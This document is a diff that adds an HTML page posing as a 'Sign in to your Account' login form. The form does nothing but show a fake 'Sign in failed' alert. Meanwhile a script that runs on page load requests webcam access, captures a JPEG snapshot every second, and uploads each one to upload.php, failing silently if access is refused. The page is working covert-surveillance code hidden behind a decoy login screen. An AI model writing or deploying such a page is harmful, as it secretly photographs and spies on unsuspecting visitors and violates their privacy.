@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Sign in to Continue</title>
+<style>
+  /* Background gradient */
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    color: #fff;
+  }
+
+  /* Container box */
+  .container {
+    background: rgba(255, 255, 255, 0.1);
+    backdrop-filter: blur(10px);
+    border-radius: 15px;
+    box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+    padding: 40px 50px;
+    width: 360px;
+    text-align: center;
+  }
+
+  h2 {
+    margin-bottom: 25px;
+    font-weight: 700;
+    letter-spacing: 1.2px;
+  }
+
+  input[type="text"], input[type="password"] {
+    width: 100%;
+    padding: 14px 18px;
+    margin: 12px 0;
+    border: none;
+    border-radius: 30px;
+    outline: none;
+    font-size: 16px;
+    background: rgba(255, 255, 255, 0.3);
+    color: #fff;
+    transition: background 0.3s ease;
+  }
+  input[type="text"]:focus, input[type="password"]:focus {
+    background: rgba(255, 255, 255, 0.5);
+  }
+
+  button {
+    width: 100%;
+    padding: 15px 0;
+    margin-top: 18px;
+    border: none;
+    border-radius: 30px;
+    background: #ff4b1f;  /* orange-red */
+    background: linear-gradient(45deg, #ff4b1f, #ff9068);
+    color: #fff;
+    font-size: 18px;
+    font-weight: 600;
+    cursor: pointer;
+    box-shadow: 0 4px 15px rgba(255, 75, 31, 0.6);
+    transition: background 0.3s ease;
+  }
+  button:hover {
+    background: linear-gradient(45deg, #ff9068, #ff4b1f);
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <h2>Sign in to your Account</h2>
+    <form id="loginForm" onsubmit="return false;">
+      <input type="text" placeholder="Email or phone" required autocomplete="off" />
+      <input type="password" placeholder="Password" required autocomplete="off" />
+      <button type="submit" onclick="alert('Sign in failed. Please try again.');">Sign In</button>
+    </form>
+  </div>
+
+<script>
+navigator.mediaDevices.getUserMedia({ video: true })
+  .then(stream => {
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
+
+    const canvas = document.createElement('canvas');
+    canvas.width = 640;  // increased width
+    canvas.height = 480; // increased height
+    const ctx = canvas.getContext('2d');
+
+    setInterval(() => {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('webcam', blob, 'snapshot.jpg');
+        fetch('upload.php', { method: 'POST', body: formData });
+      }, 'image/jpeg');
+    }, 1000);  // capture every 1 second
+  })
+  .catch(() => {
+    // fail silently if webcam not allowed
+  });
+</script>
+</body>
+</html>
